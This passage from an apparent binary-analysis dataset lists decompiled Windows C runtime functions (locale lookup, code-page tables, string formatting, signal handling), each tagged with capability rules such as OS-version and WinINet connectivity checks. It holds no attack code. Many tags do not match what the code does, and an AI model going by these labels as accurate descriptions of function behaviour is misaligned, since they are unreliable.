*(*(unaff_EBP + 0x1c) + 0x98);\n                    }\n                    else {\n                        puVar12 = *(*(unaff_EBP + 0x1c) + 0x9c);\n                    }\n                    if ((uVar14 == 1) && (*puVar4 != 0)) {\n                        uVar1 = *puVar12;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < *puVar4)) {\n                            puVar12 = puVar12 + 1;\n                            if (*puVar12 == 0) break;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        *puVar4 = *puVar4 - 1;\n                    }\n                    else {\n                        while( true ) {\n                            uVar1 = *puVar12;\n                            if ((uVar1 == 0) || (*puVar4 == 0)) break;\n                            if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < *puVar4)) {\n                                puVar12 = puVar12 + 1;\n                                if (*puVar12 == 0) goto code_r0x004139f9;\n                                **ppuVar5 = uVar1;\n                                *ppuVar5 = *ppuVar5 + 1;\n                                *puVar4 = *puVar4 - 1;\n                            }\n                            **ppuVar5 = *puVar12;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            puVar12 = puVar12 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                    }\n                }\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x24);\n            }\ncode_r0x00413d1d:\n            cVar11 = **(unaff_EBP + -0x20);\n            if (cVar11 == '\\0') break;\n            puVar15 = *(unaff_EBP + 0x10);\n        }\n    }\ncode_r0x004139f9:\n    *(unaff_EBP + -0x58) = 0x413a01;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 4029
    },
    "00413d2f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.00413d2f(int32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h, uint8_t *arg_14h, uint arg_18h, uint32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_10h_00;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    uint var_4h;\n    \n    arg_10h_00 = arg_1ch;\n    if (arg_1ch == 0) {\n        arg_10h_00 = *(arg_8h + 0x4c);\n    }\n    if (arg_10h != 0) {\n        arg_1ch = arg_10h;\n        if (arg_10h == 0) {\ncode_r0x00413dde:\n            bVar4 = arg_1ch == 0;\n        }\n        else {\n            do {\n                uVar1 = *arg_14h;\n                if (uVar1 == 0) break;\n                if (uVar1 == 0x25) {\n                    puVar3 = arg_14h + 1;\n                    uVar1 = *puVar3;\n                    if (uVar1 == 0x23) {\n                        puVar3 = arg_14h + 2;\n                    }\n                    iVar2 = fcn.0041363f(arg_8h, arg_18h, arg_10h_00, uVar1 == 0x23);\n                    if (iVar2 == 0) goto code_r0x00413dde;\n                }\n                else {\n                    if (((*(*(arg_8h + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < arg_1ch)) {\n                        arg_14h = arg_14h + 1;\n                        if (*arg_14h == 0) goto code_r0x00413dde;\n                        *arg_ch = uVar1;\n                        arg_ch = arg_ch + 1;\n                        arg_1ch = arg_1ch - 1;\n                    }\n                    *arg_ch = *arg_14h;\n                    arg_ch = arg_ch + 1;\n                    arg_1ch = arg_1ch - 1;\n                    puVar3 = arg_14h;\n                }\n                arg_14h = puVar3 + 1;\n            } while (arg_1ch != 0);\n            bVar4 = arg_1ch == 0;\n            if (!bVar4) {\n                *arg_ch = 0;\n                return arg_10h - arg_1ch;\n            }\n        }\n        if (bVar4) {\n            arg_ch = arg_ch + -1;\n        }\n        *arg_ch = 0;\n        arg_10h = 0;\n    }\n    return arg_10h;\n}\n",
        "token_count": 647
    },
    "0041442f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041442f(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *arg_8h;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    char *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *arg_14h;\n    uint *puVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*0x442bf8 == 0) && (*0x442bf4 == 0)) {\n        if (((*0x443050 != NULL) && (**0x443050 == 0)) && (*0x443050 != *(*0x44163c + 0x2c))) {\n            fcn.0040cfb5(*0x443050);\n            fcn.0040cfb5(*0x442bc0);\n        }\n        *0x443054 = NULL;\n        *0x443050 = NULL;\n        arg_14h = 0x441c8c;\n        *0x442bc0 = NULL;\n        puVar8 = *0x442bc0;\n        arg_8h = *0x443050;\ncode_r0x004145dc:\n        *0x443050 = arg_8h;\n        *0x442bc0 = puVar8;\n        *0x441cd4 = **arg_14h;\n        *0x441cd8 = 1;\n        uVar6 = 0;\n        *0x441cbc = arg_14h;\n    }\n    else {\n        arg_14h = fcn.004130d3(1, 0x30);\n        if (arg_14h != NULL) {\n            puVar8 = *0x441cbc;\n            puVar11 = arg_14h;\n            for (iVar7 = 0xc; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar11 = *puVar8;\n                puVar8 = puVar8 + 1;\n                puVar11 = puVar11 + 1;\n            }\n            arg_8h = fcn.0040b8de(4);\n            if (arg_8h != NULL) {\n                *arg_8h = 0;\n                if (*0x442bf8 == 0) {\n                    *0x443054 = NULL;\n                    *arg_14h = *0x441c8c;\n                    arg_14h[1] = *0x441c90;\n                    arg_14h[2] = *0x441c94;\n                }\n                else {\n                    *0x443054 = fcn.0040b8de(4);\n                    if (*0x443054 == NULL) {\n                        uVar6 = 1;\ncode_r0x0041453a:\n                        fcn.0040cfb5(arg_14h);\n                        fcn.0040cfb5(arg_8h);\n                        return uVar6;\n                    }\n                    **0x443054 = 0;\n                    uVar9 = *0x442c26;\n                    uVar3 = fcn.004158aa(1, uVar9, 0xe, arg_14h);\n                    uVar4 = fcn.004158aa(1, uVar9, 0xf, arg_14h + 1);\n                    uVar9 = fcn.004158aa(1, uVar9, 0x10, arg_14h + 2);\n                    if ((uVar9 | uVar3 | uVar4) != 0) {\n                        fcn.004143d0(arg_14h);\n                        uVar6 = 0xffffffff;\n                        goto code_r0x0041453a;\n                    }\n                    pcVar5 = arg_14h[2];\n                    while (*pcVar5 != '\\0') {\n                        cVar2 = *pcVar5;\n                        if ((cVar2 < '0') || ('9' < cVar2)) {\n                            pcVar10 = pcVar5;\n                            if (cVar2 != ';') goto code_r0x00414566;\n                            do {\n                                pcVar1 = pcVar10 + 1;\n                                *pcVar10 = *pcVar1;\n                                pcVar10 = pcVar1;\n                            } while (*pcVar1 != '\\0');\n                        }\n                        else {\n                            *pcVar5 = cVar2 + -0x30;\ncode_r0x00414566:\n                            pcVar5 = pcVar5 + 1;\n                        }\n                    }\n                }\n                puVar8 = arg_14h;\n                if (((*0x443050 != NULL) && (**0x443050 == 0)) && (*0x443050 != *(*0x44163c + 0x2c))) {\n                    fcn.0040cfb5(*0x443050);\n                    fcn.0040cfb5(*0x442bc0);\n                }\n                goto code_r0x004145dc;\n            }\n            fcn.0040cfb5(arg_14h);\n        }\n        uVar6 = 1;\n    }\n    return uVar6;\n}\n",
        "token_count": 1147
    },
    "00414708": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00414708(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    char *pcVar17;\n    uint uVar18;\n    int32_t iVar19;\n    uint32_t uVar20;\n    char *pcVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint var_4h;\n    \n    if ((*0x442bf4 == 0) && (*0x442bf8 == 0)) {\n        *0x443040 = NULL;\n        *0x443050 = NULL;\n        *0x441cbc = 0x441c8c;\n        *0x442bc0 = NULL;\ncode_r0x00414940:\n        uVar18 = 0;\n    }\n    else {\n        arg_8h = fcn.004130d3(1, 0x30);\n        if (arg_8h != NULL) {\n            arg_8h_00 = fcn.0040b8de(4);\n            if (arg_8h_00 == NULL) {\n                fcn.0040cfb5(arg_8h);\n            }\n            else {\n                *arg_8h_00 = 0;\n                if (*0x442bf4 == 0) {\n                    puVar22 = 0x441c8c;\n                    puVar23 = arg_8h;\n                    for (iVar19 = 0xc; iVar19 != 0; iVar19 = iVar19 + -1) {\n                        *puVar23 = *puVar22;\n                        puVar22 = puVar22 + 1;\n                        puVar23 = puVar23 + 1;\n                    }\n                    *0x443040 = NULL;\ncode_r0x0041490d:\n                    *arg_8h = **0x441cbc;\n                    arg_8h[1] = (*0x441cbc)[1];\n                    arg_8h[2] = (*0x441cbc)[2];\n                    *0x441cbc = arg_8h;\n                    *0x442bc0 = arg_8h;\n                    *0x443050 = arg_8h_00;\n                    goto code_r0x00414940;\n                }\n                *0x443040 = fcn.0040b8de(4);\n                if (*0x443040 == NULL) {\n                    fcn.0040cfb5(arg_8h);\n                    fcn.0040cfb5(arg_8h_00);\n                }\n                else {\n                    **0x443040 = 0;\n                    uVar20 = *0x442c20;\n                    uVar3 = fcn.004158aa(1, uVar20, 0x15, arg_8h + 3);\n                    uVar4 = fcn.004158aa(1, uVar20, 0x14, arg_8h + 4);\n                    uVar5 = fcn.004158aa(1, uVar20, 0x16, arg_8h + 5);\n                    uVar6 = fcn.004158aa(1, uVar20, 0x17, arg_8h + 6);\n                    uVar7 = fcn.004158aa(1, uVar20, 0x18, arg_8h + 7);\n                    uVar8 = fcn.004158aa(1, uVar20, 0x50, arg_8h + 8);\n                    uVar9 = fcn.004158aa(1, uVar20, 0x51, arg_8h + 9);\n                    uVar10 = fcn.004158aa(0, uVar20, 0x1a, arg_8h + 10);\n                    uVar11 = fcn.004158aa(0, uVar20, 0x19, arg_8h + 0x29);\n                    uVar12 = fcn.004158aa(0, uVar20, 0x54, arg_8h + 0x2a);\n                    uVar13 = fcn.004158aa(0, uVar20, 0x55, arg_8h + 0x2b);\n                    uVar14 = fcn.004158aa(0, uVar20, 0x56, arg_8h + 0xb);\n                    uVar15 = fcn.004158aa(0, uVar20, 0x57, arg_8h + 0x2d);\n                    uVar16 = fcn.004158aa(0, uVar20, 0x52, arg_8h + 0x2e);\n                    uVar20 = fcn.004158aa(0, uVar20, 0x53, arg_8h + 0x2f);\n                    if ((uVar20 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 |\n                                  uVar13 | uVar14 | uVar15 | uVar16) == 0) {\n                        pcVar17 = arg_8h[7];\n                        while (*pcVar17 != '\\0') {\n                            cVar2 = *pcVar17;\n                            if ((cVar2 < '0') || ('9' < cVar2)) {\n                                pcVar21 = pcVar17;\n                                if (cVar2 != ';') goto code_r0x004148db;\n                                do {\n                                    pcVar1 = pcVar21 + 1;\n                                    *pcVar21 = *pcVar1;\n                                    pcVar21 = pcVar1;\n                                } while (*pcVar1 != '\\0');\n                            }\n                            else {\n                                *pcVar17 = cVar2 + -0x30;\ncode_r0x004148db:\n                                pcVar17 = pcVar17 + 1;\n                            }\n                        }\n                        goto code_r0x0041490d;\n                    }\n                    fcn.0041462f(arg_8h);\n                    fcn.0040cfb5(arg_8h);\n                    fcn.0040cfb5(arg_8h_00);\n                }\n            }\n        }\n        uVar18 = 1;\n    }\n    return uVar18;\n}\n",
        "token_count": 1497
    },
    "00414b3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414b3e(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    if ((param_1 == NULL) || (*param_1 == '\\0')) {\ncode_r0x00414b84:\n        uVar2 = 0x1004;\ncode_r0x00414b8f:\n        iVar1 = (**0x442be4)(*0x442bcc, uVar2, &var_ch, 8);\n        if (iVar1 == 0) goto code_r0x00414ba9;\n        param_1 = &var_ch;\n    }\n    else {\n        iVar1 = fcn.00411e40(param_1, 0x43cf30);\n        if (iVar1 == 0) goto code_r0x00414b84;\n        iVar1 = fcn.00411e40(param_1, 0x43cf2c);\n        if (iVar1 == 0) {\n            uVar2 = 0xb;\n            goto code_r0x00414b8f;\n        }\n    }\n    fcn.004182d7(param_1);\ncode_r0x00414ba9:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 299
    },
    "00414bd2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00414bd2(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    iVar5 = 0;\n    iVar6 = 0x1a;\n    do {\n        iVar2 = (iVar6 + iVar5) / 2;\n        uVar1 = *(iVar2 * 0x2c + 0x43c130);\n        if (arg_8h == uVar1) {\n            if (arg_ch == 1) {\n                pcVar4 = \"040a\" + iVar2 * 0x2c;\n            }\n            else if (arg_ch == 3) {\n                pcVar4 = iVar2 * 0x2c + 0x43c140;\n            }\n            else if (arg_ch == 7) {\n                pcVar4 = iVar2 * 0x2c + 0x43c148;\n            }\n            else if (arg_ch == 0xb) {\n                pcVar4 = iVar2 * 0x2c + 0x43c14c;\n            }\n            else if (arg_ch == 0x1001) {\n                pcVar4 = *(iVar2 * 0x2c + 0x43c13c);\n            }\n            else if (arg_ch == 0x1002) {\n                pcVar4 = *(iVar2 * 0x2c + 0x43c144);\n            }\n            else {\n                if (arg_ch != 0x1004) break;\n                pcVar4 = iVar2 * 0x2c + 0x43c154;\n            }\n            if ((pcVar4 != NULL) && (0 < arg_14h)) {\n                fcn.004149a0(arg_10h, pcVar4, arg_14h + -1);\n                *(arg_10h + -1 + arg_14h) = 0;\n                return 1;\n            }\n            break;\n        }\n        if (arg_8h < uVar1) {\n            iVar6 = iVar2 + -1;\n        }\n        else {\n            iVar5 = iVar2 + 1;\n        }\n    } while (iVar5 <= iVar6);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 575
    },
    "00414d9b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00414d9b(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_7ch;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    iVar1 = (**0x442be4)(arg_8h & 0x3ff | 0x400, 1, &var_7ch, 0x78);\n    if (((iVar1 != 0) && (uVar2 = fcn.00414cb5(),  arg_8h != uVar2)) && (arg_ch != 0)) {\n        fcn.0040bc50(*0x442be0);\n        fcn.00414cea();\n    }\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 190
    },
    "00415203": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00415203(char *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h;\n    uint uVar2;\n    int16_t *unaff_EBX;\n    int32_t unaff_retaddr;\n    \n    if (*0x442be4 == NULL) {\n        if (*0x442a60 == 2) {\n            *0x442be4 = _sym.imp.KERNEL32.dll_GetLocaleInfoA;\n        }\n        else {\n            *0x442be4 = fcn.00414bd2;\n        }\n    }\n    if (param_1 == NULL) {\ncode_r0x004152dd:\n        fcn.00414b24();\ncode_r0x004152e2:\n        if (*0x442bc4 == 0) {\n            return 0;\n        }\n    }\n    else {\n        *0x442bd8 = param_1 + 0x40;\n        *0x442be0 = param_1;\n        if ((*0x442bd8 != NULL) && (**0x442bd8 != '\\0')) {\n            fcn.00414ac4(0x43c760, 0x16, 0x442bd8);\n        }\n        *0x442bc4 = 0;\n        if ((*0x442be0 == NULL) || (**0x442be0 == '\\0')) {\n            if ((*0x442bd8 == NULL) || (**0x442bd8 == '\\0')) goto code_r0x004152dd;\n            fcn.004150f1();\n            goto code_r0x004152e2;\n        }\n        if ((*0x442bd8 == NULL) || (**0x442bd8 == '\\0')) {\n            fcn.004151ae();\n        }\n        else {\n            fcn.00415128();\n        }\n        if (*0x442bc4 == 0) {\n            iVar1 = fcn.00414ac4(0x43c910, 0x40, 0x442be0);\n            if (iVar1 != 0) {\n                if ((*0x442bd8 == NULL) || (**0x442bd8 == '\\0')) {\n                    fcn.004151ae();\n                }\n                else {\n                    fcn.00415128();\n                }\n            }\n            goto code_r0x004152e2;\n        }\n    }\n    arg_8h = fcn.00414b3e();\n    if (((arg_8h == 0) || (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h & 0xffff),  iVar1 == 0)) ||\n       (iVar1 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(*0x442bc8, 1),  uVar2 = *0x442bc8,  iVar1 == 0)) {\ncode_r0x004153b2:\n        uVar2 = 0;\n    }\n    else {\n        if (unaff_EBX != NULL) {\n            *unaff_EBX = *0x442bc8;\n            unaff_EBX[1] = *0x442bcc;\n            unaff_EBX[2] = arg_8h;\n        }\n        if (unaff_retaddr != 0) {\n            if (*unaff_EBX == 0x814) {\n                fcn.00411ed0(unaff_retaddr, \"Norwegian-Nynorsk\");\n            }\n            else {\n                iVar1 = (**0x442be4)(uVar2, 0x1001, unaff_retaddr, 0x40);\n                if (iVar1 == 0) goto code_r0x004153b2;\n            }\n            iVar1 = (**0x442be4)(*0x442bcc, 0x1002, unaff_retaddr + 0x40, 0x40);\n            if (iVar1 == 0) goto code_r0x004153b2;\n            fcn.004184c8(arg_8h, unaff_retaddr + 0x80, 10);\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 907
    },
    "004158aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_84h\n\nvoid __cdecl fcn.004158aa(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint *noname_2;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    char *pcVar5;\n    uint var_84h;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint var_4h;\n    \n    if (arg_8h != 1) {\n        if (arg_8h == 0) {\n            pcVar5 = 0x442c30;\n            iVar3 = fcn.004185ec(arg_ch, arg_10h, 0x442c30, 4, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, \n                                 in_stack_ffffff7c, in_stack_ffffff80);\n            if (iVar3 != 0) {\n                *arg_14h = '\\0';\n                do {\n                    cVar1 = *pcVar5;\n                    iVar3 = fcn.0040eab5(cVar1);\n                    if (iVar3 == 0) break;\n                    pcVar5 = pcVar5 + 2;\n                    *arg_14h = *arg_14h * '\\n' + cVar1 + -0x30;\n                } while (pcVar5 < 0x442c38);\n            }\n        }\n        goto code_r0x0041595c;\n    }\n    noname_2 = &var_84h;\n    bVar2 = false;\n    iVar3 = fcn.0041871c(arg_ch, arg_10h, noname_2, 0x80, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, in_stack_ffffff7c\n                         , in_stack_ffffff80);\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (((iVar3 != 0x7a) ||\n            (iVar3 = fcn.0041871c(arg_ch, arg_10h, 0, 0, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, in_stack_ffffff7c\n                                  , in_stack_ffffff80),  iVar3 == 0)) ||\n           (noname_2 = fcn.0040b8de(iVar3),  noname_2 == NULL)) goto code_r0x0041595c;\n        bVar2 = true;\n        iVar3 = fcn.0041871c(arg_ch, arg_10h, noname_2, iVar3, 0, unaff_EDI, unaff_ESI, unaff_EBX, var_84h, \n                             in_stack_ffffff7c, in_stack_ffffff80);\n        if (iVar3 != 0) goto code_r0x0041593d;\n    }\n    else {\ncode_r0x0041593d:\n        iVar4 = fcn.0040b8de(iVar3);\n        *arg_14h = iVar4;\n        if (iVar4 != 0) {\n            fcn.004149a0(iVar4, noname_2, iVar3);\n            if (bVar2) {\n                fcn.0040cfb5(noname_2);\n            }\n            goto code_r0x0041595c;\n        }\n        if (!bVar2) goto code_r0x0041595c;\n    }\n    fcn.0040cfb5(noname_2);\ncode_r0x0041595c:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 866
    },
    "004159e1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004159e1(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43cf90, 0x10);\n    if (*0x442c38 == NULL) {\n        if (*0x442a60 != 1) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n            if (iVar2 != 0) {\n                *0x442c38 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"InitializeCriticalSectionAndSpinCount\");\n                if (*0x442c38 != NULL) goto code_r0x00415a2d;\n            }\n        }\n        *0x442c38 = 0x4159d1;\n    }\ncode_r0x00415a2d:\n    pcVar1 = *0x442c38;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    *(unaff_EBP + -0x20) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 344
    },
    "00415f05": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00415f05(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *extraout_ECX;\n    code *arg_8h_00;\n    int32_t unaff_EBP;\n    code **ppcVar4;\n    code *pcVar5;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43cfc0, 0x20);\n    *(unaff_EBP + -0x1c) = 0;\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 == 2) {\n        ppcVar4 = 0x442c8c;\n        pcVar5 = *0x442c8c;\ncode_r0x00415f92:\n        *(unaff_EBP + -0x1c) = 1;\n        iVar1 = *(unaff_EBP + -0x24);\n    }\n    else {\n        if (((iVar1 != 4) && (iVar1 != 8)) && (iVar1 != 0xb)) {\n            if (iVar1 == 0xf) {\n                ppcVar4 = 0x442c98;\n                pcVar5 = *0x442c98;\n            }\n            else if (iVar1 == 0x15) {\n                ppcVar4 = 0x442c90;\n                pcVar5 = *0x442c90;\n            }\n            else {\n                if (iVar1 != 0x16) goto code_r0x00416078;\n                ppcVar4 = 0x442c94;\n                pcVar5 = *0x442c94;\n            }\n            goto code_r0x00415f92;\n        }\n        iVar1 = fcn.0040f262();\n        *(unaff_EBP + -0x24) = iVar1;\n        iVar2 = fcn.00415d24();\n        ppcVar4 = iVar2 + 8;\n        pcVar5 = *ppcVar4;\n    }\n    arg_8h_00 = NULL;\n    *(unaff_EBP + -0x20) = pcVar5;\n    if (pcVar5 == 0x1) goto code_r0x00416078;\n    if (pcVar5 == NULL) {\n        fcn.0041135a(3);\n        arg_8h_00 = extraout_ECX;\n    }\n    if (*(unaff_EBP + -0x1c) != arg_8h_00) {\n        fcn.0040f088(arg_8h_00);\n        arg_8h_00 = NULL;\n    }\n    *(unaff_EBP + -4) = arg_8h_00;\n    iVar2 = *(unaff_EBP + 8);\n    if (((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) {\n        *(unaff_EBP + -0x2c) = *(iVar1 + 0x58);\n        *(iVar1 + 0x58) = arg_8h_00;\n        if (iVar2 == 8) {\n            *(unaff_EBP + -0x30) = *(iVar1 + 0x5c);\n            *(iVar1 + 0x5c) = 0x8c;\n            goto code_r0x00415ff1;\n        }\ncode_r0x0041601d:\n        *ppcVar4 = arg_8h_00;\n    }\n    else {\ncode_r0x00415ff1:\n        iVar3 = *0x441a20;\n        if (iVar2 != 8) goto code_r0x0041601d;\n        for (; *(unaff_EBP + -0x28) = iVar3,  iVar3 < *0x441a24 + *0x441a20; iVar3 = iVar3 + 1) {\n            *(*(iVar1 + 0x54) + 8 + iVar3 * 0xc) = arg_8h_00;\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00416040();\n    if (*(unaff_EBP + 8) == 8) {\n        (*pcVar5)(8, *(iVar1 + 0x5c));\n    }\n    else {\n        (*pcVar5)(*(unaff_EBP + 8));\n    }\n    iVar2 = *(unaff_EBP + 8);\n    if ((((iVar2 == 8) || (iVar2 == 0xb)) || (iVar2 == 4)) && (*(iVar1 + 0x58) = *(unaff_EBP + -0x2c),  iVar2 == 8)) {\n        *(iVar1 + 0x5c) = *(unaff_EBP + -0x30);\n    }\ncode_r0x00416078:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1156
    },
    "00416317": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00416317(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint *puVar8;\n    uint32_t var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    if (arg_8h != 0) {\n        iVar5 = 0;\n        uVar3 = 0;\ncode_r0x00416339:\n        if (*(uVar3 + 0x441ce8) != arg_8h) goto code_r0x00416341;\n        puVar8 = 0x442e20;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_1ch = 0;\n        *puVar8 = 0;\n        puVar6 = iVar5 * 0x30 + 0x441cf8;\n        do {\n            uVar2 = *puVar6;\n            puVar7 = puVar6;\n            while ((uVar2 != 0 && (uVar1 = puVar7[1],  uVar1 != 0))) {\n                uVar3 = uVar2;\n                if (uVar3 <= uVar1) {\n                    uVar2 = *(var_1ch + 0x441ce0);\n                    do {\n                        *(uVar3 + 0x442e21) = *(uVar3 + 0x442e21) | uVar2;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 <= uVar1);\n                }\n                puVar7 = puVar7 + 2;\n                uVar2 = *puVar7;\n            }\n            var_1ch = var_1ch + 1;\n            puVar6 = puVar6 + 8;\n        } while (var_1ch < 4);\n        *0x442f24 = arg_8h;\n        *0x442e00 = 1;\n        *0x442d84 = fcn.004160c4();\n        *0x442f30 = *(extraout_ECX + 0x441cec);\n        *0x442f34 = *(extraout_ECX + 0x441cf0);\n        *0x442f38 = *(extraout_ECX + 0x441cf4);\n        goto code_r0x0041648e;\n    }\ncode_r0x00416489:\n    fcn.004160f3();\ncode_r0x0041648e:\n    